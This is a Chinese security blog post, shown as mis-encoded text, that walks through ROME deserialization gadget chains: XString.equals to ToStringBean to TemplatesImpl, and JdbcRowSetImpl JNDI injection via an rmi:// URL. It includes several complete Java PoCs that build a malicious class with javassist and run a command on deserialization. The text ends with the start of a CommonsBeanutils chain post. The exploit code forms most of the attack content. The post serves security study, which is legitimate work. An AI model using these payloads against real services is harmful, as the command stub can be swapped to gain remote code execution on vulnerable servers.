å‰é¢åˆ©ç”¨åˆ°äº†XStringç±»çš„equals()æ–¹æ³•ï¼Œè¿™ä¸ªç±»ä½äºcom.sun.org.apache.xpath.internal.objects.XStringã€‚æ—¢ç„¶éƒ½æ˜¯åˆ©ç”¨equals()æ–¹æ³•äº†ï¼Œç®€å•æƒ³äº†ä¸€ä¸‹æ€è·¯ï¼Œå…¶å®ä¹Ÿæ˜¯å’Œå‰é¢è¿™ä¸ªå·®ä¸å¤šäº†ï¼Œä½†æ˜¯å°±åˆ©ç”¨è€Œè¨€æ›´å¤šçš„æ˜¯è¿™é‡Œçš„XStringèµ·äº†ä¸€ä¸ªä¸­è½¬çš„ä½œç”¨ï¼Œåœ¨ROMEé“¾ä¸­çš„æœ¬æ¥æ€è·¯æ˜¯equals()æ–¹æ³•å°±å¯ä»¥ç›´æ¥æ‰“getterä»è€Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ï¼Œåœ¨è¿™é‡Œçš„è¯å°±ç®€å•ä»¥ä¸€ä¸ªXStringè§¦å‘ROMEé“¾ä¸­çš„toStringé“¾æ¥è¿›è¡Œåˆ†æï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒXStringä¸æ˜¯ROMEä¸­ç‰¹æœ‰çš„é“¾ï¼Œæ‰€ä»¥åœ¨å…¶ä»–åœ°æ–¹ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œæ¯”å¦‚jacksonæˆ–è€…fastjsonç­‰ã€‚\nå…·ä½“æ€è·¯å…¶å®ä¹Ÿå·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œè¿‡ç¨‹ä¹Ÿå·²ç»éå¸¸æ¸…æ™°äº†ï¼ŒåŸºæœ¬ç›˜å°±æ˜¯å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import javax.xml.transform.Templates; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.syndication.feed.impl.ToStringBean; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import java.util.HashMap; import java.util.Hashtable; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean x1 = new ToStringBean(Templates.class,impl); XString xString = new XString(\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,xString); hashMap0.put(\u0026#34;yy\u0026#34;,x1); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,x1); hashMap1.put(\u0026#34;yy\u0026#34;,xString); hash.put(hashMap0,\u0026#34;1\u0026#34;); hash.put(hashMap1,\u0026#34;2\u0026#34;); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆ‘è¿™é‡Œæ˜¯é€‰ç”¨çš„Hashtableç±»ä½œä¸ºå…¥å£ç±»ï¼Œè¿™ä¸ªç±»çš„å…³äºé”®å€¼å¯¹çš„å¤„ç†æ¯”è¾ƒæ¸…æ™°ã€‚è¿™é‡Œä¹Ÿä¸ç”¨å†åˆ†æäº†ï¼Œè¿‡ç¨‹å¤ªç†Ÿæ‚‰äº†ï¼Œå”¯ä¸€çš„é—®é¢˜å°±æ˜¯çœ‹Hashtableä¸­æ˜¯å¦å¯ä»¥ç¬¬äºŒæ¬¡æ­£å¸¸æ”¾å…¥é”®å€¼å¯¹ï¼Œå¹¶ä¸”è¾¾åˆ°åªåœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœºï¼Œè€Œåºåˆ—åŒ–æ—¶ä¸å¼¹å‡ºè®¡ç®—æœºã€‚\nä½†æ˜¯è¿™é‡Œå…¶å®ä¹Ÿæ˜¯å’Œå‰é¢çš„HotSwappableTargetSourceæœ‰ç‚¹åƒï¼Œå¯¹äºæ˜¯å¦å¯ä»¥å­˜å‚¨è¿›ä¸¤ä¸ªå€¼ï¼Œå½“Hashtabelç±»putè¿›ç¬¬äºŒä¸ªå€¼æ—¶ï¼Œä¼šè°ƒç”¨åˆ°HashMapçš„çˆ¶ç±»AbstractMapçš„equals()æ–¹æ³•ï¼š\nä»è€Œå¯ä»¥è°ƒç”¨åˆ°XStringç±»çš„equals()æ–¹æ³•ï¼š\nè¿™é‡Œè¿›è¡Œçš„obj2.toString()è°ƒç”¨ï¼Œæœ€åè¿”å›çš„æ˜¯æŠ¥é”™ä¿¡æ¯ï¼š\nç„¶åè‚¯å®šä¸ä¼šå’Œå®ä¾‹åŒ–XStringæ—¶ä¼ å…¥çš„fupancç›¸åŒï¼Œè¿”å›falseï¼š\næœ€åè¿”å›falseï¼Œä»è€Œå¯ä»¥æˆåŠŸæ”¾å…¥ä¸¤ä¸ªé”®å€¼å¯¹ã€‚\nå…¶å®éƒ½æ˜¯è¯´è¿‡äº†çš„ï¼Œå…¶ä»–ä¸å¤šè¯´äº†ï¼Œpocå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import javax.xml.transform.Templates; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.syndication.feed.impl.ToStringBean; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import java.util.HashMap; import java.util.Hashtable; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean x1 = new ToStringBean(Templates.class,impl); XString xString = new XString(\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,xString); hashMap0.put(\u0026#34;yy\u0026#34;,x1); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,x1); hashMap1.put(\u0026#34;yy\u0026#34;,xString); hash.put(hashMap0,\u0026#34;1\u0026#34;); hash.put(hashMap1,\u0026#34;2\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ä¹Ÿæ˜¯åªå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼Œä¹Ÿæ˜¯æŠ¥é”™ï¼š\n1 Exception in thread \u0026#34;main\u0026#34; java.lang.ClassNotFoundException: Evil è¿™é‡Œå†æƒ³äº†ä¸€ä¸‹ï¼Œå¯èƒ½æ˜¯javassistçš„åŸå› ï¼Ÿæˆ–è€…ç”±äºåºåˆ—åŒ–æ—¶JVMå·²ç»åŠ è½½äº†Evilè¿™ä¸ªç±»ï¼Ÿ\né‚£ä¹ˆåŒæ ·å°†å…¶æ”¹æˆåªåœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºï¼Œæœ€åçš„pocå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import javax.xml.transform.Templates; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.syndication.feed.impl.ToStringBean; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import java.util.HashMap; import java.util.Hashtable; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean x1 = new ToStringBean(String.class,\u0026#34;fupanc\u0026#34;); XString xString = new XString(\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,xString); hashMap0.put(\u0026#34;yy\u0026#34;,x1); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,x1); hashMap1.put(\u0026#34;yy\u0026#34;,xString); hash.put(hashMap0,\u0026#34;1\u0026#34;); hash.put(hashMap1,\u0026#34;2\u0026#34;); setFieldValue(x1,\u0026#34;_beanClass\u0026#34;,Templates.class); setFieldValue(x1,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸåªåœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœºã€‚\nJdbcRowSetImpl fastjsonä¸­æåˆ°è¿‡çš„ç±»ï¼Œè¿™ä¸ªç±»å­˜åœ¨ä¸€ä¸ªconnect()æ–¹æ³•å­˜åœ¨jndiæ³¨å…¥æ¼æ´ï¼š\néå¸¸å¥½å®ç°jndiæ³¨å…¥æ¼æ´ï¼Œè¿™é‡Œçš„connå˜é‡åœ¨ç±»åˆå§‹åŒ–æ—¶å°±ä¼šè®¾ç½®ä¸ºnullï¼Œä¼šè°ƒç”¨åˆ°else ifä¸­çš„æ–¹æ³•ï¼Œç„¶åæ§åˆ¶getDataSourceName()æ–¹æ³•æœ‰å€¼å³å¯ã€‚å¹¶ä¸”è¿™ä¸ªç±»å­˜åœ¨ä¸€ä¸ªgetteræ–¹æ³•æœ‰è°ƒç”¨connect()æ–¹æ³•çš„é€»è¾‘ï¼š\næˆ‘ä»¬å¯ä»¥çŸ¥é“romeé“¾çš„é‚£å‡ æ¡é“¾å­éƒ½å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„getteræ–¹æ³•ï¼Œæ‰€ä»¥ç›´æ¥æ‰“å°±è¡Œäº†ï¼Œä»¥toStringé“¾ä¸ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example; import java.lang.reflect.Field; import javax.management.BadAttributeValueExpException; import com.sun.rowset.JdbcRowSetImpl; import com.sun.syndication.feed.impl.ToStringBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { JdbcRowSetImpl rs = new JdbcRowSetImpl(); rs.setDataSourceName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); ToStringBean x1 = new ToStringBean(JdbcRowSetImpl.class,rs); setFieldValue(bad,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } å¸¸è§„çš„jndiæ‰“æ³•ï¼Œæ³¨æ„jdkç‰ˆæœ¬ï¼Œä½†æ˜¯è¿™é‡Œè¿è¡Œå‘ç°å¹¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—æœºï¼Œè°ƒè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°è¿˜æ˜¯å’Œå‰é¢æåˆ°çš„æŠ¥é”™ä¸€æ ·ï¼Œè¿™é‡Œç”±äºæœ‰å¾ˆå¤šçš„getteræ–¹æ³•ï¼Œåœ¨æ²¡è°ƒç”¨åˆ°æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‰å°±ç›´æ¥æŠ¥é”™é€€å‡ºäº†ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨è¿™ä¸ªæ–¹æ³•åç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè§£å†³æ–¹æ³•è‡³å°‘æœ‰ä¸¤ä¸ªï¼š\nåƒä¹‹å‰é‚£æ ·æ‰¾ä¸€ä¸ªclassç±»ï¼ŒåŒ…å«çš„getteræ–¹æ³•å°‘ï¼Œå¹¶ä¸”èƒ½è°ƒç”¨åˆ°getDatabaseMetaData()æ–¹æ³• è¿˜æœ‰å°±æ˜¯æ ¹æ®æŠ¥é”™ï¼Œè®©æ–¹æ³•è°ƒç”¨ä¸å†æŠ¥é”™ï¼Œä»è€Œå¯ä»¥è°ƒç”¨åˆ°æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„æ–¹æ³•ã€‚ å¦‚æœèƒ½æ‰¾åˆ°ï¼Œé‚£ä¹ˆç¬¬ä¸€ç§æ–¹æ³•æ˜¯æœ€å¥½æ‰“çš„ï¼Œä½†æ˜¯æ‰¾äº†ä¸€åœˆï¼Œæ²¡çœ‹åˆ°JdbcRowSetImplçš„çˆ¶ç±»æˆ–è€…æ¥å£ç±»æœ‰å®šä¹‰getDatabaseMetaData()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•åº”è¯¥æ˜¯JdbcRowSetImplè‡ªå¸¦çš„ï¼Œæ‰€ä»¥åªèƒ½é‡‡ç”¨ç¬¬äºŒä¸ªæ–¹æ³•ã€‚\nå®šä½åˆ°getMatchColumnNames()æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥æ‰“æ–­ç‚¹è°ƒè¯•ï¼š\nä¹Ÿå°±æ˜¯è®©è¿™ä¸ªæœ‰å€¼å³å¯ï¼Œè·Ÿè¿›è¿™ä¸ªstrMatchColumnså˜é‡çš„èµ‹å€¼ï¼Œåœ¨æ„é€ æ–¹æ³•ä¸­ï¼š\nè¿™é‡Œçš„Vectorç±»ï¼Œæˆ‘ä»¬ä¹Ÿæ¥è§¦è¿‡äº†ï¼Œè¿™é‡Œå°±æ˜¯å¾€å¾€é‡Œé¢æ”¾å…¥å€¼ï¼š\nè·Ÿè¿›å†çœ‹insertElementAt()æ–¹æ³•ï¼š\nå°±æ˜¯ç»™è¿™ä¸ªæ•°ç»„ç±»å‹çš„å˜é‡é‡Œé¢æ’å…¥å€¼ï¼š\næ‰€ä»¥å‰é¢çš„æ“ä½œå°±æ˜¯å°†è¿™ä¸ªæ•°ç»„ç±»å‹çš„å˜é‡å…¨éƒ¨å¡«æ»¡ï¼Œç„¶åéƒ½æ˜¯nullç±»å‹ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³è¦ä¸æŠ¥é”™ï¼Œå°±éœ€è¦ç¬¬ä¸€ä¸ªå€¼ä¸ä¸ºnullï¼š\nç›´æ¥åå°„è·å–ç„¶åè°ƒç”¨ç±»å‡½æ•°ä¿®æ”¹å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package org.example; import java.lang.reflect.Field; import javax.management.BadAttributeValueExpException; import com.sun.rowset.JdbcRowSetImpl; import com.sun.syndication.feed.impl.ToStringBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.util.Vector; public class Main{ public static void main(String[] args) throws Exception { JdbcRowSetImpl rs = new JdbcRowSetImpl(); rs.setDataSourceName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); Vector obj = (Vector)getFieldValue(rs, \u0026#34;strMatchColumns\u0026#34;); obj.insertElementAt(\u0026#34;fupanc\u0026#34;,0); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); ToStringBean x1 = new ToStringBean(JdbcRowSetImpl.class,rs); setFieldValue(bad,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } public static Object getFieldValue(Object obj, String fieldName) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); return field.get(obj); } catch (Exception e) { clazz = clazz.getSuperclass(); } } return null; } } è°ƒè¯•å‘ç°å¯ä»¥è®©è¿™ä¸ªæ–¹æ³•å°±ä¸ä¼šæ‰”å‡ºå¼‚å¸¸äº†ï¼Œå¹¶ä¸”è¿™ä¸ªæ–¹æ³•è¿‡åå°±æ˜¯æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„getDatabaseMetaData()æ–¹æ³•ï¼š\nç„¶åå†æ‰“jndiæ³¨å…¥æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nåé¢çœ‹äº†ä¸€ä¸‹ç½‘ä¸Šçš„åˆ†ææ–‡ç« ï¼Œå‘ç°å…¶å®JdbcRowSetImplç±»è‡ªå·±å®šä¹‰äº†ä¸€ä¸ªç±»ç”¨æ¥ç»™strMatchColumnså˜é‡è¿›è¡Œæ”¹å€¼ï¼š\nè·Ÿè¿›set()æ–¹æ³•ï¼š\nä¹Ÿæ˜¯ä¸€ä¸ªæ”¹å€¼çš„æ“ä½œï¼Œå¹¶ä¸”åˆšå¥½æ˜¯æˆ‘ä»¬éœ€è¦æ”¹çš„ä¸‹æ ‡0çš„å€¼ï¼Œæ‰€ä»¥å¦‚ä¸‹æ‰“ä¹Ÿæ˜¯å¯ä»¥çš„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example; import java.lang.reflect.Field; import javax.management.BadAttributeValueExpException; import com.sun.rowset.JdbcRowSetImpl; import com.sun.syndication.feed.impl.ToStringBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { JdbcRowSetImpl rs = new JdbcRowSetImpl(); rs.setDataSourceName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); rs.setMatchColumn(\u0026#34;fupanc\u0026#34;); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); ToStringBean x1 = new ToStringBean(JdbcRowSetImpl.class,rs); setFieldValue(bad,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æ›´ç®€çŸ­çš„payloadã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E9%93%BE%E4%B9%8BHotSwappableTargetSource%E9%93%BE/\nhttps://goodapple.top/archives/1145\nhttps://boogipop.com/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/#HotSwappableTargetSource%E5%88%A9%E7%94%A8%E9%93%BE\nhttps://xz.aliyun.com/news/12729\n","date":"2024-08-13T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/rome%E9%93%BE/","title":"Romeé“¾"},{"content":"CBé“¾ ç¯å¢ƒé…ç½® ç¯å¢ƒé…ç½® pom.xmlæ·»åŠ ï¼š\n1 2 3 4 5 6 7 8 9 10 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-beanutils\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-beanutils\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.8.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-logging\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-logging\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; æµ‹è¯•ç¯å¢ƒ commons-beanutils 1.8.3 commons-logging:commons-logging:1.2 JDK 8u411 commons-collections3.2.1 è¿™é‡Œéœ€è¦3.2.1çš„åŸå› æ˜¯åé¢è¦åˆ©ç”¨çš„BeanComparatorè¦ç”¨ï¼š è¸©äº†ä¸€ä¸‹å‘ï¼Œè¿™é‡Œ4æ˜¯ç”¨ä¸äº†çš„\næ­£å¼å­¦ä¹  Apache Commons Beanutils æ˜¯ Apache Commons å·¥å…·é›†ä¸‹çš„å¦ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒæä¾›äº†å¯¹æ™®é€šjavaç±»å¯¹è±¡ï¼ˆä¹Ÿç§°ä¸ºJavaBeanï¼‰çš„ä¸€äº›æ“ä½œæ–¹æ³•ã€‚\nè€ŒJavaBeanæ˜¯ä¸€ä¸ªéµå¾ªç‰¹å®šå†™æ³•çš„Javaç±»ï¼Œå®ƒé€šå¸¸å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š\nè¿™ä¸ªç±»å¿…é¡»å…·æœ‰ä¸€ä¸ªæ— å‚çš„æ„é€ å‡½æ•°ï¼ˆä¸€èˆ¬æˆ‘ä»¬æ²¡è‡ªå®šä¹‰æ„é€ å‡½æ•°çš„è¯é»˜è®¤çš„å°±æ˜¯æ— å‚çš„æ„é€ å‡½æ•°ï¼‰ å±æ€§å¿…é¡»ç§æœ‰åŒ– ç§æœ‰åŒ–çš„å±æ€§å¿…é¡»é€šè¿‡publicç±»å‹çš„æ–¹æ³•æš´éœ²ç»™å…¶ä»–ç¨‹åºï¼Œå¹¶ä¸”æ–¹æ³•çš„å‘½åä¹Ÿå¿…é¡»éµå®ˆä¸€å®šçš„å‘½åè§„èŒƒã€‚ æ¯”å¦‚å¦‚ä¸‹çš„Catç±»å°±æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„JavaBeanç±»ï¼š\n1 2 3 4 5 6 7 8 9 10 11 final public class Cat { private String name = \u0026#34;catalina\u0026#34;; public String getName() { return name; } public void setName(String name) { this.name = name; } } å®ƒåŒ…å«ä¸€ä¸ªç§æœ‰å±æ€§nameï¼Œå’Œè¯»å–å’Œè®¾ç½®è¿™ä¸ªå±æ€§çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œåˆç§°ä¸ºgetterå’Œsetterã€‚\néœ€è¦äº†è§£çš„ç±» PropertyUtils å®ƒæ˜¯å¯¹JavaBeanè¿›è¡Œæ“ä½œçš„å·¥å…·ç±»ï¼Œå¯å•ç‹¬ä¸ºæŸä¸ªå±æ€§è¿›è¡Œå€¼çš„æ“ä½œçš„å·¥å…·ç±»ã€‚å®ƒåˆ©ç”¨åå°„æ“ä½œBeançš„å±æ€§ã€‚è¿™ä¸ªç±»ä½äºorg.apache.commons.beanutils.PropertyUtilsã€‚\nPropertyUtilsç±»ä¸­æä¾›äº†ä¸€äº›publicçš„é™æ€æ–¹æ³•ï¼Œä»¥ä¾¿ç›´æ¥è°ƒç”¨ä¸€äº›getterå’Œsetteræ–¹æ³•ï¼š\ngetPropertyï¼šè¿”å›æŒ‡å®šBeançš„æŒ‡å®šå±æ€§çš„å€¼ getSimplePropertyï¼šè¿”å›æ‰§è¡ŒBeançš„æŒ‡å®šå±æ€§çš„å€¼ setPropertyï¼šè®¾ç½®æŒ‡å®šBeançš„æŒ‡å®šå±æ€§çš„å€¼ setSimplePropertyï¼šè®¾ç½®æŒ‡å®šBeançš„æŒ‡å®šå±æ€§çš„å€¼ çœ‹ä¸€ä¸ªå®ä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; import org.apache.commons.beanutils.PropertyUtils; public class Main{ private String name; public void setName(String name){ this.name = name; } public String getName(){ return this.name; } public static void main(String[] args) throws Exception { Main x = new Main(); PropertyUtils.setProperty(x,\u0026#34;name\u0026#34;,\u0026#34;fupanc\u0026#34;); System.out.println(x.getName()); x.setName(\u0026#34;haha\u0026#34;); System.out.println(PropertyUtils.getProperty(x,\u0026#34;name\u0026#34;)); } } è¾“å‡ºä¸ºï¼š\n1 2 fupanc haha çœ‹è¿™ä¸ªç»“æœå·²ç»å¾ˆå®¹æ˜“çŸ¥é“å‰é¢çš„æ–¹æ³•æ˜¯å¹²å˜›çš„äº†ã€‚æ³¨æ„ä¸€ä¸‹åœ¨è°ƒç”¨æ–¹æ³•æ—¶å¯¹äºå‚æ•°è®¾ç½®çš„é—®é¢˜ã€‚\næ‰€ä»¥è¿™é‡Œå…¶å®å¾ˆå®¹æ˜“çœ‹å‡ºï¼ŒPropertyUtils.getProperty/setPropertyæ–¹æ³•ï¼Œå‚æ•°ä¸€å®šè¦æ³¨æ„ï¼Œå…¶å®å°±å¯ä»¥ç†è§£ä¸ºè°ƒç”¨å¯¹åº”ç±»å˜é‡çš„getterå’Œsetteræ–¹æ³•ã€‚\nBeanComparator 